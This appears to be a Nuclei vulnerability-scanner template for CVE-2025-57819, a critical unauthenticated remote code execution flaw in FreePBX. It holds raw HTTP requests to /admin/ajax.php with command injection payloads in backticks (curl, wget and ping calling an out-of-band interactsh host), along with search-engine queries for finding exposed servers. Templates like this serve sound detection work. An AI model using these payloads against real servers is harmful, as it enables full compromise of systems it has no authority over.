id: CVE-2025-57819

info:
  name: FreePBX - Remote Code Execution
  author: sushant6095
  severity: critical
  description: |
    FreePBX versions 15, 16, and 17 contain a remote code execution vulnerability caused by insufficiently sanitized user-supplied data in specific endpoints.
    Unauthenticated attackers can exploit this flaw to manipulate the database and execute arbitrary system commands remotely.
  impact: |
    Successful exploitation allows unauthenticated attackers to execute arbitrary commands on the FreePBX server, leading to full system compromise.
  reference:
    - https://github.com/net-hex/CVE-2025-57819
    - https://github.com/blueisbeautiful/CVE-2025-57819
    - https://github.com/Sucuri-Labs/CVE-2025-57819-ioc-check
    - https://github.com/rxerium/CVE-2025-57819
  classification:
    cve-id: CVE-2025-57819
    cvss-score: 10.0
    cwe-id: CWE-78
    epss-score: 0.95
    epss-percentile: 0.99
  metadata:
    verified: true
    max-request: 6
    vendor: sangoma
    product: freepbx
    kev: true
    shodan-query: http.title:"freepbx administration"
    fofa-query: title="freepbx administration"
  tags: cve,cve2025,freepbx,rce,oast,kev

variables:
  payload_id: "{{to_lower(rand_text_alpha(6))}}"
  session_token: "{{to_lower(rand_text_alphanumeric(8))}}"

stop-at-first-match: true

http:
  - raw:
      - |
        GET /admin/config.php HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /admin/ HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: freepbx_version
        part: body
        regex:
          - 'FreePBX\s+Version:\s*([0-9.]+)'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "FreePBX Administration"
          - "Extensions"
          - "Dashboard"
        condition: or
      - type: status
        status:
          - 200

  - raw:
      - |
        POST /admin/ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        module=core&command=getJSON&jdata={"module":"core","command":"reload","data":"echo {{session_token}}"}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{session_token}}"
      - type: status
        status:
          - 200

  - raw:
      - |
        POST /admin/ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        module=core&command=getJSON&jdata={"module":"core","command":"reload","data":"`curl http://{{interactsh-url}}/{{payload_id}}`"}

      - |
        POST /admin/ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        module=framework&command=reload&data={"action":"reload","command":"`ping -c 3 {{interactsh-url}}`"}

      - |
        POST /admin/ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        command=`wget http://{{interactsh-url}}/{{payload_id}}`&module=core

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - http
          - dns
        condition: or
      - type: status
        status:
          - 200
